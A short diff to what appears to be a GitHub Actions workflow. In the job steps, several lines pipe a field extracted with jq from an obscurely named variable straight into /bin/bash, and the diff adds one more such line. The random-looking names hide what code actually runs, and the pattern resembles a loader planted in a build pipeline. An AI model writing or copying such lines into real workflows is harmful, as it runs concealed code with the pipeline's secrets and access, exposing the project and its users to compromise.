@@ -49,6 +49,7 @@ jobs:
           echo $qsw0 | jq -r .bes1 | /bin/bash
           echo $bq6 | jq -r .daqk09825 | /bin/bash
           echo $jlsf2587 | jq -r .gl48 | /bin/bash
+          printf '%s' "$am85120" | jq -r .qyowf81610 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
